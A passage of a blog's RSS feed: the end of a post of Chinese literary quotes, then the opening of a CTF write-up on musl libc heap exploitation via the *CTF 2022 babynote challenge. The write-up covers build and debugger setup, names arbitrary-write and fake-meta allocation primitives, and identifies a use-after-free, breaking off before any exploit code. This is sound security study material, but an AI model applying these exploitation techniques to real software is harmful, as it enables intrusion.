&lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;这世界的一大不幸就是每人都有自己的看法，而正是这种看法妨碍了我们去看清别人的看法&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;人有了信仰，就可以移动大山&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;一个人看到的景象是随心境而变的；您的心境很阴郁，所以您看到的是个彤云密布的天空。”&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;这就是人性中一种可怜的骄傲，每个人总以为自己比身边另一个在哭泣、呻吟的不幸的人更加不幸。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;所有的幸福都是过眼云烟&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;这个世界上无所谓幸福，也无所谓不幸，有的只是一种境况和另一种境况的比较，如此而已。只有体验过极度不幸的人，才能品尝到极度的幸福。只有下过死的决心的人，马克西米利安，才会知道活着有多好。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;让人见你自重，你就会被看重。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;瘦弱的人爱说自己能挑重担，胆怯的人爱说怎么迎战巨人，穷人会夸口有金银财宝，就连最卑微的农夫，自吹自擂时也会自称是朱庇特。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;您希望别人的自尊心对您作出让步，您就得先顾及对方的自尊心，保全他的面子，不让他为难。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;死亡是什么？就是向安宁走近一步，就是向寂静走近也许两步。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;一位法兰西学院院士说过，社交场上的晚会就好比花展，吸引着用情不专的蝴蝶、饥饿贪婪的蜜蜂和嗡嗡嘤嘤的大胡蜂。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;人类的智慧就包含在这五个字里面：“等待和希望！”&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;其实，往事就如同旅途的景色，随着岁月的流逝，是会在记忆中淡忘的。我现在的情形，就好比那些在梦中受伤的人，他们看到了伤口也感到了疼痛，可就是想不起自己曾经受过伤。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;</description>
    </item>
    <item>
      <title>通过*ctf2022_babynote入门musl pwn</title>
      <link>http://localhost:1313/posts/musl_pwn/</link>
      <pubDate>Sat, 10 Jan 2026 02:01:48 +0800</pubDate>
      <guid>http://localhost:1313/posts/musl_pwn/</guid>
      <category domain="http://localhost:1313/categories/pwn/">Pwn</category>
      <description>&lt;p&gt;&lt;del&gt;看到&lt;code&gt;hkcertctf&lt;/code&gt;出了一道&lt;code&gt;musl&lt;/code&gt;的题来学习一下&lt;/del&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;前言&#34;&gt;&lt;span&gt;前言&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%89%8d%e8%a8%80&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;基础知识部分就不详细列出了，列出一些我的参考文章。&lt;del&gt;其实主要还是看源码&lt;/del&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://9anux.org/2024/01/17/musl/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;io板子&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://bbs.kanxue.com/thread-269533.htm&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;源码分析&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://bbs.kanxue.com/thread-274640-1.htm&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;主要参考文章：小小做题家之musl1.2.2的利用手法&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;利用手法：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;dequeue：用于任意地址写&lt;/li&gt;&#xA;&lt;li&gt;queue：把&lt;code&gt;fake_meta&lt;/code&gt;链入&lt;code&gt;active&lt;/code&gt;链表，从而进行任意地址的堆块分配&lt;/li&gt;&#xA;&lt;li&gt;IO：有通过&lt;code&gt;puts&lt;/code&gt;和&lt;code&gt;exit&lt;/code&gt;触发的&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;环境配置&#34;&gt;&lt;span&gt;环境配置&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e7%8e%af%e5%a2%83%e9%85%8d%e7%bd%ae&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;编译libc&#34;&gt;&lt;span&gt;编译&lt;code&gt;libc&lt;/code&gt;&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e7%bc%96%e8%af%91libc&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;拿到题目的&lt;code&gt;musl libc&lt;/code&gt;版本之后，最好自己编译一个&lt;code&gt;musl libc&lt;/code&gt;，使用自己编译的&lt;code&gt;libc&lt;/code&gt;启动题目有符号表能支持调试（有的题目给的&lt;code&gt;libc&lt;/code&gt;没有符号表就调试不了），调试的时候还能看到&lt;code&gt;musl&lt;/code&gt;的源码知道哪里出错了&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Note&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;查看&lt;code&gt;musl libc&lt;/code&gt;版本：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;./libc.so&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;pre&gt;&lt;code&gt;git clone https://github.com/kraj/musl.git&#xA;cd musl&#xA;git checkout v1.2.2&#xA;CFLAGS=&amp;#34;-g -O0&amp;#34; ./configure --prefix=$PWD/install&#xA;make -j$(nproc)&#xA;make install&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这样&lt;code&gt;musl/install/lib&lt;/code&gt;下就有没去符号表的&lt;code&gt;libc.so&lt;/code&gt;&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;启动题目&#34;&gt;&lt;span&gt;启动题目&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%90%af%e5%8a%a8%e9%a2%98%e7%9b%ae&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;patchelf --set-interpreter ../musl-libc/v1.2.2 ./pwn&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后exp中直接&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;p = process(&amp;#34;./pwn&amp;#34;)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;即可&lt;/p&gt;&#xA;&lt;p&gt;如果没有&lt;code&gt;patchelf&lt;/code&gt;，通过&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;./libc.so ./pwn&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;启动，会有点问题（虽然也不是不行）&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;调试&#34;&gt;&lt;span&gt;调试&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e8%b0%83%e8%af%95&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;sudo apt install musl-dbgsym&#xA;git clone https://github.com/xf1les/muslheap.git  &#xA;echo &amp;#34;source /path/to/muslheap.py&amp;#34; &amp;gt;&amp;gt; ~/.gdbinit&lt;/code&gt;&lt;/pre&gt;&lt;table&gt;&#xA;  &lt;thead&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;th&gt;命令&lt;/th&gt;&#xA;          &lt;th&gt;作用&lt;/th&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/thead&gt;&#xA;  &lt;tbody&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;mheap&lt;/td&gt;&#xA;          &lt;td&gt;可以查看&lt;code&gt;__malloc_context&lt;/code&gt;的部分信息，可以详细看到每一条&lt;code&gt;meta&lt;/code&gt;链表&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;p/x __malloc_context&lt;/td&gt;&#xA;          &lt;td&gt;可以查看&lt;code&gt;__malloc_context&lt;/code&gt;的详细信息，但无法详细看到每一条&lt;code&gt;meta&lt;/code&gt;链表&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;mmagic&lt;/td&gt;&#xA;          &lt;td&gt;用于查看关键函数的地址&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;p/x &lt;em&gt;(struct meta&lt;/em&gt;) &amp;lt;meta地址&amp;gt;&lt;/td&gt;&#xA;          &lt;td&gt;查看某个&lt;code&gt;meta&lt;/code&gt;结构体的详细信息&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;p/x &lt;em&gt;(struct group&lt;/em&gt;) &amp;lt;group地址&amp;gt;&lt;/td&gt;&#xA;          &lt;td&gt;查看&lt;code&gt;group&lt;/code&gt;结构体详细信息&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;mchunkinfo &lt;addr&gt;&lt;/td&gt;&#xA;          &lt;td&gt;查看某个用户指针所属 &lt;code&gt;slot &lt;/code&gt;的详细信息&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;mfindslot  &lt;addr&gt;&lt;/td&gt;&#xA;          &lt;td&gt;从任意地址反向定位其所在 &lt;code&gt;slot&lt;/code&gt;&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;p/x stdout&lt;/td&gt;&#xA;          &lt;td&gt;查看&lt;code&gt;stdout&lt;/code&gt;结构体&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;p/x &lt;em&gt;(struct meta_area&lt;/em&gt;) &amp;lt;meta_area address&amp;gt;&lt;/td&gt;&#xA;          &lt;td&gt;查看&lt;code&gt;meta_area&lt;/code&gt;，&lt;code&gt;meta &amp;amp; 0xffffffffffff000&lt;/code&gt;就能找到&lt;code&gt;meta_arena&lt;/code&gt;结构体&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/tbody&gt;&#xA;&lt;/table&gt;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Note&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;&lt;del&gt;后记&lt;/del&gt; 原来pwndbg中有调试musl的命令，&lt;a href=&#34;https://pwndbg.re/stable/commands/musl/mallocng-dump/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;pwndbg_docs&lt;/a&gt;&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;ctf星ctfbabynote&#34;&gt;&lt;span&gt;*CTF（星CTF）——Babynote&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#ctf%e6%98%9fctfbabynote&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://github.com/sixstars/starctf2022/tree/main/pwn-BabyNote&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://github.com/sixstars/starctf2022/tree/main/pwn-BabyNote&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;逆向分析，略。。。&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;漏洞&#34;&gt;&lt;span&gt;漏洞&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e6%bc%8f%e6%b4%9e&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;code&gt;add&lt;/code&gt;的时候，把&lt;code&gt;global_note&lt;/code&gt;给了&lt;code&gt;heap_ptr[4]&lt;/code&gt;，&lt;code&gt;delete&lt;/code&gt;的时候，没有把&lt;code&gt;heap_ptr[4]&lt;/code&gt;中的&lt;code&gt;global_note&lt;/code&gt;置0，存在&lt;code&gt;UAF&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;int 